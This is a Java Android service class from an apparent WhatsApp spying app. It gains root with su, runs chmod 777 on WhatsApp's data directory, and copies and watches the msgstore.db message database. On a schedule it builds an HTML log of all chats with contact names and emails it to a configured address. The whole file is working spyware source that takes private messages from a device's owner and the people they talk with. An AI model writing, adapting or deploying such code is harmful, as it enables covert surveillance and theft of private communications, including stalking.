package com.android.whatslog;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.sql.SQLException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import javax.mail.AuthenticationFailedException;
import javax.mail.MessagingException;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.AsyncTask;
import android.os.FileObserver;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

import com.android.whatslog.dao.DatabaseHelperConfiguracao;
import com.android.whatslog.dao.DatabaseHelperExternal;
import com.android.whatslog.dao.DatabaseHelperInternal;
import com.android.whatslog.model.ChatList;
import com.android.whatslog.model.Configuracao;
import com.android.whatslog.model.Messages;
import com.j256.ormlite.dao.Dao;

public class MyService extends Service {

	private FileObserver observer;
	private String pathToWatch;
	private Dao<Messages, Integer> daoMsgInternal;
	private Dao<Messages, Integer> daoMsgExternal;
	private Dao<ChatList, Integer> daoChatInternal;
	private Dao<ChatList, Integer> daoChatExternal;
	private ScheduledExecutorService scheduleTaskExecutor;
	private DatabaseHelperInternal internal;
	private DatabaseHelperExternal external;
	private Map<String, List<Messages>> listaMensagens;
	private GMailSender gmail;

	public MyService() {
	}

	@Override
	public IBinder onBind(Intent intent) {
		// TODO: Return the communication channel to the service.
		throw new UnsupportedOperationException("Not yet implemented");
	}

	private void chmod() {
		Process process = null;
		DataOutputStream dataOutputStream = null;
		try {
			process = Runtime.getRuntime().exec("su");
			dataOutputStream = new DataOutputStream(process.getOutputStream());
			dataOutputStream.writeBytes("chmod -R 777 "
					+ android.os.Environment.getDataDirectory().toString()
					+ "/data/com.whatsapp\n");
			dataOutputStream
					.writeBytes("chmod -R 777 "
							+ getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
							+ "\n");
			dataOutputStream.writeBytes("exit\n");
			dataOutputStream.flush();
			process.waitFor();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			try {
				if (dataOutputStream != null) {
					dataOutputStream.close();
				}
				process.destroy();
			} catch (Exception e) {
			}
		}
	}

	@Override
	public void onCreate() {
		pathToWatch = android.os.Environment.getDataDirectory().toString()
				+ "/data/com.whatsapp/databases/msgstore.db";

		chmod();
		try {
			String inFileName = getApplicationContext().getPackageManager()
					.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
					+ "/databases/msgstore.db";

			File dest = new File(inFileName);

			if (!dest.exists()) {

				File source = new File(pathToWatch);
				try {

					File dir = new File(
							getApplicationContext().getPackageManager()
									.getPackageInfo(getPackageName(), 0).applicationInfo.dataDir
									+ "/databases/");
					if (!dir.exists())
						dir.mkdir();

					dest.createNewFile();
					Utils.copyFile(source, dest);
				} catch (IOException e) {
					e.printStackTrace();
				}
			}

		} catch (NameNotFoundException e) {
			e.printStackTrace();
		}

		gmail=new GMailSender(getApplicationContext());

	}

	@Override
	public void onStart(Intent intent, int startId) {

		// final String pathToWatch =
		// android.os.Environment.getDataDirectory().toString()+"/data/com.whatsapp/databases/msgstore.db";

		internal = new DatabaseHelperInternal(getApplicationContext());
		external = new DatabaseHelperExternal(getApplicationContext());

		try {
			daoMsgInternal = internal.getMessagesDao();
			daoMsgExternal = external.getMessagesDao();
			daoChatInternal = internal.getChatDao();
			daoChatExternal = external.getChatDao();

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		observer = new FileObserver(pathToWatch) { // set up a file observer to
													// watch this directory on
													// sd card

			@Override
			public void onEvent(int event, String file) {

				switch (event) {
				case FileObserver.MODIFY:
					Log.d("DEBUG", "MODIFY:" + pathToWatch + file);

					updateMsg();
					updateChat();
					break;
				default:
					// just ignore
					break;
				}

				// Toast.makeText(getBaseContext(), file + " was saved!",
				// Toast.LENGTH_LONG);
				// }
			}
		};
		observer.startWatching(); // START OBSERVING

		// For time consuming an long tasks you can launch a new thread here...
		Toast.makeText(this, " Service Started", Toast.LENGTH_LONG).show();

		DatabaseHelperConfiguracao database = new DatabaseHelperConfiguracao(
				getApplicationContext());
		List<Configuracao> confs;
		try {
			confs = database.getDao().queryForAll();
			Configuracao conf = null;

			if (confs.size() > 0) {
				conf = confs.get(0);
			}
			if (conf != null) {

				scheduleTaskExecutor = Executors.newScheduledThreadPool(5);

				// This schedule a task to run every 10 minutes:
				scheduleTaskExecutor.scheduleAtFixedRate(new Runnable() {
					public void run() {
						prepare();
					}
				}, 0, conf.getIntervalo() * 60 * 1000, TimeUnit.MILLISECONDS);
			}
		} catch (Exception e) {
		}

	}

	@Override
	public void onDestroy() {
		Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();

	}

	private void updateMsg() {

		try {
			List<Messages> mensagens = daoMsgInternal.queryForAll();
			List<Messages> m = daoMsgExternal.queryForAll();
			Set<Messages> nova = new HashSet<Messages>();
			for (Messages mensagem : m) {

				if (!mensagens.contains(mensagem)) {
					nova.add(mensagem);
				}

			}

			for (Messages mensagem : nova) {
				try {
					daoMsgInternal.create(mensagem);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void updateChat() {

		try {
			List<ChatList> chats = daoChatInternal.queryForAll();
			List<ChatList> m = daoChatExternal.queryForAll();
			Set<ChatList> nova = new HashSet<ChatList>();
			for (ChatList chat : m) {

				if (!chats.contains(chat)) {
					nova.add(chat);
				}

			}

			for (ChatList chat : nova) {
				try {
					daoChatInternal.create(chat);
				} catch (SQLException e) {
					e.printStackTrace();
				}
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private void prepare() {

		File outputDir = getApplicationContext().getCacheDir(); // context being
		try {

			StringBuilder html = new StringBuilder();

			html.append(getChatList());
			html.append(loadMessages());

			List<File> anexos = new ArrayList<File>();
//			File chatsFile = File.createTempFile("chats", ".html", outputDir);
			File chatsFile=new File(outputDir, "logs_"+(new SimpleDateFormat("dd_MM_yyyy").format(new Date())));
			OutputStream output = new FileOutputStream(chatsFile);
			output.write(wrapHtml(html).toString().getBytes());
			output.flush();
			output.close();

			anexos.add(chatsFile);
			if(Utils.isConnected(getApplicationContext()))
				new SendEmailAsyncTask().execute(anexos);

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	private StringBuilder wrapHtml(StringBuilder html) {
		StringBuilder tmp = new StringBuilder();

		tmp.append("<html><head></head><body>").append(html)
				.append("</body></html>");
		return tmp;
	}

	private StringBuilder getChatList() {
		StringBuilder chattmp = new StringBuilder();
		chattmp.append("<table colspan=\"1\" border=\"1\"><tr><td>Chats</td></tr>");

		try {
			// DatabaseHelperInternal internal = new DatabaseHelperInternal(
			// getApplicationContext());
			List<ChatList> chats = internal.getChatDao().queryBuilder()
					.groupBy("key_remote_jid").query();
			int i = 0;
			for (ChatList chat : chats) {

				String nome = chat.getKey_remote_jid();

				try {
					nome = Utils.getContactDisplayNameByNumber(chat
							.getKey_remote_jid(), getApplication()
							.getContentResolver());

				} catch (Exception e) {
				}

				chattmp.append("<tr style=\""
						+ (i % 2 == 0 ? "background:#FCFFCD" : "")
						+ "\"><td><a href=\"#" + chat.getKey_remote_jid()
						+ "\">" + nome + "</a></td></tr>");
				i++;
			}

		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		chattmp.append("</table>");
		return chattmp;

	}

	private StringBuilder loadMessages() {

		try {
			listaMensagens = new HashMap<String, List<Messages>>();
			List<Messages> mensagens = internal.getMessagesDao().queryForAll();

			for (Messages message : mensagens) {

				if (!listaMensagens.containsKey(message.getKey_remote_jid())) {
					listaMensagens.put(message.getKey_remote_jid(),
							new ArrayList<Messages>());
				}

				listaMensagens.get(message.getKey_remote_jid()).add(message);

			}

			StringBuilder tmp = new StringBuilder();

			Set<String> keys = listaMensagens.keySet();

			for (String key : keys) {
				tmp.append(getMessageList(key, listaMensagens.get(key)))
						.append("<br/>");
			}
			return tmp;
		} catch (SQLException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return new StringBuilder();

	}

	private StringBuilder getMessageList(String id, List<Messages> mensagens) {

		String nome = id;
		try {
			nome = Utils.getContactDisplayNameByNumber(id, getApplication()
					.getContentResolver());
		} catch (Exception e) {
		}

		StringBuilder tmp = new StringBuilder();
		tmp.append("<table id=\""
				+ id
				+ "\" colspan=\"1\" border=\"1\"><tr><th colspan=\"3\">Chat with "
				+ nome
				+ "</th></tr><tr><td>Date</td><td>Sender</td><td>Message</td></tr>");

		Collections.sort(mensagens);

		for (Messages message : mensagens) {
			String tmpcontato=nome;
			if (message.getKey_from_me() == 1)
				tmpcontato = "ME";

			tmp.append("<tr style=\""
					+ (message.getKey_from_me() == 0 ? "background:#FCFFCD" : "")
					+ "\"><td>"
					+ new SimpleDateFormat("dd/MM/yyyy HH:mm:ss")
							.format(message.getTimestamp()) + "</td><td>"
					+ tmpcontato + "</td><td>" + message.getData() + "</td></tr>");
		}

		tmp.append("</table>");
		return tmp;

	}

	class SendEmailAsyncTask extends AsyncTask<List<File>, Void, Boolean> {

		DatabaseHelperConfiguracao database;
		Configuracao conf = null;
//		Mail m;

		public SendEmailAsyncTask() {
			database = new DatabaseHelperConfiguracao(getApplicationContext());
			List<Configuracao> confs;
			try {
				confs = database.getDao().queryForAll();


				if (confs.size() > 0) {
					conf = confs.get(0);
				}
//				if (conf != null) {
//					m = new Mail(conf.getSmtpMail(), conf.getPassword());
//
//					String[] toArr = { conf.getEmailTo() };
//					m.setTo(toArr);
//					m.setFrom("whatslog@gmail.com");
//					m.setSubject(conf.getSubject());
//					m.setBody("Check the attached file");

//				}
			} catch (Exception e) {

			}
		}

		protected Boolean doInBackground(List<File>... anexos) {
			try {

				for (File file : anexos[0]) {
					gmail.addAttachment(file.getName()+".html", file.getAbsolutePath());
				}

//				m.send();
				if(conf!=null){
					gmail.sendMail(conf.getSubject(), "Check the attached file", null, conf.getEmailTo());
				}
				return true;
			} catch (AuthenticationFailedException e) {
				Log.e(SendEmailAsyncTask.class.getName(), "Bad account details");
				e.printStackTrace();
				return false;
			} catch (MessagingException e) {
				e.printStackTrace();
				return false;
			} catch (Exception e) {
				e.printStackTrace();
				return false;
			}
		}
	}
}